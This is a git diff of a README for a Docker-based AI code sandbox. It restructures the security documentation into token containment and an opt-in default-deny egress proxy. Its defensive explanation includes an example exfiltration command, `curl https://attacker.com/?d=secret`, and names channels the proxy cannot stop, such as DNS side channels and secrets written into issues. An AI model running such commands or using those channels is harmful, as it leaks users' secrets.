@@ -28,7 +28,7 @@ This MCP routes all AI operations through **disposable Docker containers** with 
 | AI operations never touch the host | All file ops, package installs, and test runs happen inside the container. If the AI breaks something — delete the container and move on. |
 | No network by default | `allow_network=True` must be explicitly set. AI can't accidentally call external APIs, download payloads, or push to remotes. |
 | Non-root execution | Container runs as unprivileged user `sandbox`. No `sudo`, no system package modification. |
-| VCS tokens stay host-side | The container never receives a `GITHUB_TOKEN`. Reads authenticate through the [egress proxy](#vcs-token-safety)'s read-authorization grant; `publish` / `sandbox_issue_write` resolve the token host-side. Token values are masked in all output (`KEY=***`). |
+| VCS tokens stay host-side | The container never receives a `GITHUB_TOKEN`. Reads authenticate through the [egress proxy](#security-model)'s read-authorization grant; `publish` / `sandbox_issue_write` resolve the token host-side. Token values are masked in all output (`KEY=***`). |
 | Audit trail | Every operation is recorded in an append-only journal. You can trace exactly what the AI did, after the fact. |
 
 The value of this MCP is as much about **what the AI cannot do** as what it can.
@@ -312,7 +312,7 @@ A minimal variant (`docker/Dockerfile.sandbox.minimal`) with git + python + pyte
 
 For production use, keep GitHub credentials in the **OS keystore** instead of plaintext config files and let the server mint short-lived tokens on demand. The security model below is the same on every platform — only the keystore backend, the unlock UX, and how the server process is launched differ.
 
-> This section covers **host-side** credential resolution (how the server authenticates to GitHub). It is complementary to [VCS token safety](#vcs-token-safety) below, which covers why the *container* never receives a token, regardless of platform.
+> This section covers **host-side** credential resolution (how the server authenticates to GitHub). It is complementary to the [security model](#security-model) below, which covers why the *container* never receives a token, regardless of platform.
 
 ### The shared security model: short-lived GitHub App tokens
 
@@ -321,7 +321,7 @@ The recommended model uses [mcp-launcher](https://github.com/masuda-masuo/mcp-la
 - **Secrets live in the OS keystore, never in config files.** The GitHub App's `APP_ID`, `PRIVATE_KEY`, and `INSTALLATION_ID` are registered once with `mcp-token register github <KEY> <value>`.
 - **Tokens are minted on demand and short-lived.** `mcp-token github` mints a fresh installation token (cached ~55 min; GitHub expiry 1 h). No long-lived token sits in a config file or environment.
 - **The private key is out of reach.** A prompt-injection attack can only touch what the model sees — MCP tool responses — never the keystore. Worst case, a leaked token expires within an hour; the key that mints tokens is never exposed.
-- **The host resolves the token; the container never holds it.** The resolved token is used host-side by the egress proxy's read/push grants and by `publish` / `sandbox_issue_write` (see [VCS token safety](#vcs-token-safety)).
+- **The host resolves the token; the container never holds it.** The resolved token is used host-side by the egress proxy's read/push grants and by `publish` / `sandbox_issue_write` (see [security model](#security-model)).
 
 The host resolves the token from one of three orthogonal sources (`token_broker.py`, design.md §11.2):
 
@@ -406,27 +406,66 @@ Same as WSL2, but on a desktop-session Linux the keyring unlocks automatically w
 | Keyring unlock | automatic at Windows login | one prompt per WSL boot | automatic with desktop session |
 | Main gotcha | Smart App Control may block the binary | quoting · `DBUS_SESSION_BUS_ADDRESS` · `secret-tool` fallback | keyring daemon must be running |
 
-## VCS token safety
+## Security model
 
-The sandbox container **never receives a VCS token.** There is no opt-in flag: credentials stay host-side, and the egress proxy is the structural guard that keeps them there. Use `allow_network=True` only when containers actually need network access.
+The sandbox offers two **independent** guarantees. They are easy to conflate, so keep them distinct: one is always on and does not involve the egress proxy at all; the other is what the (opt-in) egress proxy adds.
 
-- **Reads** (`clone_repo`, `sandbox_initialize(clone_repo=...)`, `pr=N`) authenticate at the network layer: when a repo needs credentials, a host-resolved token is handed to the proxy for a short read-authorization grant, so even a *private* clone or PR checkout works without a token ever entering the container.
+### 1. Token containment — always on, proxy-independent
+
+The sandbox container **never receives a VCS token.** There is no opt-in flag: credentials stay host-side. This is enforced by *how the write tools work*, not by the network layer — so it holds whether or not the egress proxy is enabled.
+
+- **Reads** (`clone_repo`, `sandbox_initialize(clone_repo=...)`, `pr=N`): a public clone needs no credential; a private one has a host-resolved token handed to the proxy for a short read-authorization grant (this path does require the proxy). Either way no token enters the container.
 - **Pushes / PRs** go through `publish`: it resolves a token host-side and hands it to the proxy for a short authorized push grant (push), or calls the GitHub API directly from the host (PR creation).
 - **Issue / comment writes** go through `sandbox_issue_write`, which calls the GitHub REST API host-side.
 - All output is automatically sanitized: any token value is masked as `KEY=***` in stdout/stderr.
 
-This follows the principle of least privilege — the container's own `git`/`gh` stay unauthenticated, so a stray in-container `git push` has no credential to leak. The proxy must be configured with a host-resolvable token (broker / `GITHUB_TOKEN`) for the read and push grants to authenticate.
+This follows the principle of least privilege — the container's own `git`/`gh` stay unauthenticated, so a stray in-container `git push` has no credential to leak.
+
+### 2. Egress containment — the egress proxy (opt-in)
+
+The egress proxy is enabled with `CODE_SANDBOX_ENABLE_EGRESS_PROXY=true` (staged rollout; **off by default**). When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. On top of that the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:
+
+- **Where the sandbox may connect** — `CODE_SANDBOX_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries (see below); everything else is denied.
+- **Where the sandbox may write** — `CODE_SANDBOX_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.
+
+Use `allow_network=True` only when containers actually need network access. For the read/push grants to authenticate, the proxy must be configured with a host-resolvable token (broker / `GITHUB_TOKEN`).
+
+### What each configuration guarantees
+
+| Guarantee | proxy **off** (default) | proxy **on** |
+|---|---|---|
+| No token ever enters the container | ✅ (proxy-independent) | ✅ |
+| Push restricted to an allowlist (network layer) | ❌ | ✅ (`CODE_SANDBOX_ALLOWED_REPOS`) |
+| Non-HTTP egress cut off (SSH / raw TCP / direct IP) | ❌ (`allow_network=True` is unrestricted) | ✅ (internal network, proxy is the only exit) |
+| Arbitrary-host egress denied (exfil containment) | ❌ | ✅ (`CODE_SANDBOX_ALLOWED_EGRESS_HOSTS`, default-deny) |
+| Private-repo read (`clone` / `pr=N`) | ❌ (anonymous clone only) | ✅ (read grant) |
+| Fail-closed (network start refused if the proxy fails to start) | — | ✅ |
+
+**Who should turn it on?** If the sandbox runs code you do not fully trust (AI-generated, third-party dependencies, anything that could be prompt-injected) and you care about it not phoning home, enable the proxy. If you only run your own code against your own repos and treat the sandbox as a convenience rather than a boundary, the default (off) is fine — token containment still holds either way.
+
+**What it does *not* guarantee.** Egress containment stops connections to *off-allowlist hosts*; it does not stop a determined exfil over an *allowlisted* channel (e.g. writing secrets into an issue on an allowed repo, or DNS/SNI side channels). It is a structural barrier against casual/arbitrary egress, not a complete information-flow boundary.
 
 ### Configuring the egress proxy
 
-When `CODE_SANDBOX_ENABLE_EGRESS_PROXY=true` is set, the egress proxy enforces an **allowlist** of repositories that the sandbox can push to. This is configured via the `CODE_SANDBOX_ALLOWED_REPOS` environment variable:
+**Push targets** — `CODE_SANDBOX_ALLOWED_REPOS` is the allowlist of repositories the sandbox may push to:
 
 ```bash
 # Allow pushes to specific repositories
 CODE_SANDBOX_ALLOWED_REPOS="owner/repo-a,owner/repo-b"
 ```
 
-If `CODE_SANDBOX_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let adminstration proceed with a misconfigured setup (see [#401](https://github.com/masuda-masuo/code-sandbox-mcp/issues/401)).
+If `CODE_SANDBOX_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let administration proceed with a misconfigured setup (see [#401](https://github.com/masuda-masuo/code-sandbox-mcp/issues/401)).
+
+**Destination hosts** — `CODE_SANDBOX_ALLOWED_EGRESS_HOSTS` extends the built-in set of hosts the sandbox may reach at all:
+
+```bash
+# Allow the sandbox to also reach an internal mirror and any *.example.com host
+CODE_SANDBOX_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
+```
+
+- The built-in defaults — `github.com`, `api.github.com`, `codeload.github.com`, `*.githubusercontent.com`, `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org` — are **always** allowed so `git`, `pip`, and `npm` work out of the box; operator entries only *add* to them.
+- An entry beginning with `.` matches that domain and its subdomains (`.example.com` → both `example.com` and `a.example.com`).
+- The single value `*` disables destination-host containment entirely (any host passes), restoring the pre-containment passthrough behaviour for operators who need it.
 
 ## Observability
 
